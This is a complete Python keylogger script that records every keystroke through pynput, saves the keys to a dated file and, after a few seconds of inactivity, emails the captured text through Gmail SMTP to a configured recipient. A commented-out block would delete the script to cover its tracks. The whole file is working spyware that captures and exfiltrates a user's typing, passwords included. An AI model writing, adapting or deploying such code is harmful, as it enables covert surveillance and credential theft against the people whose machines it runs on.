from pynput import keyboard
from datetime import datetime
from decouple import config
import smtplib
import time
import threading
import os

# Import environmental variables
EMAIL = config("MY_EMAIL")
APP_PASS = config("APP_PASSWORD")
SEND_TO = config("SEND_TO")

# Initialize the list to store all the pressed
input_keys = list()

# This is how long the program will wait before it stops running
TIMEOUT = 5

# Get current time in seconds
timeout_start = time.time()

# Name of the file to write to
write_file = str(datetime.now()).split(' ')[0] + "_keys.txt"

# Function used to write all the input keys to a file.


def write_logged_keys():

    # Open the file with a+ to append to the file, but still be able to read from it
    with open(write_file, "a+") as file:

        # Loop through all the keys stored in the input_keys list
        for item in input_keys:

            # Remove any instance of the word "Key" at the start of a key
            if item[0:3] == "Key":
                item = item.split(".")[1]

            # Write to file and add a new line
            file.write(item + "\n")

        # Move back to the beginning of the file
        file.seek(0)

        # return the contents of the file
        return file.read()


# Function that checks if the timeout time-frame has been reached.  If so, it will call
# the write file function and then exit stop running the file
def check_inactivity():
    while True:

        # If the current time in seconds is greater than the timeout time along with the start time, run the code
        if time.time() > timeout_start + TIMEOUT:
            mail_body = write_logged_keys()
            send_email(mail_body)
            # code that could delete this file after some amount of idle time.
            # cur_dir = os.getcwd()
            # os.remove(cur_dir + "/keylogger.py")

            # Exits the program
            os._exit(0)

        # stops the thread for 5 seconds
        time.sleep(5)


# Function used to send an email
def send_email(file):

    # Send using gmail using a secure version of SMTP
    with smtplib.SMTP("smtp.gmail.com", port=587) as connection:

        # Initialize encryption and login as the sender
        connection.starttls()
        connection.login(user=EMAIL, password=APP_PASS)

        # Send the email with the data passed into the function
        connection.sendmail(
            from_addr=EMAIL,
            to_addrs=SEND_TO,
            msg=f"Subject:Logged Keys \n\n {file}"
        )


# This runs the check_activity function in the background
back_thread = threading.Thread(name="timeout_check", target=check_inactivity)
back_thread.start()


# This uses the pynput library to listen for events.  If the event is a key-down event, it will
# add the pressed key to list of all keys pressed.
with keyboard.Events() as events:
    for event in events:

        # Only record events that are keydown events, ignore keyup.
        if type(event) is keyboard.Events.Press:

            # Turn the key into a string
            key_pressed = str(event.key)

            # Add the key to the list
            input_keys.append(key_pressed)

            # Restart the time since last keypress
            timeout_start = time.time()
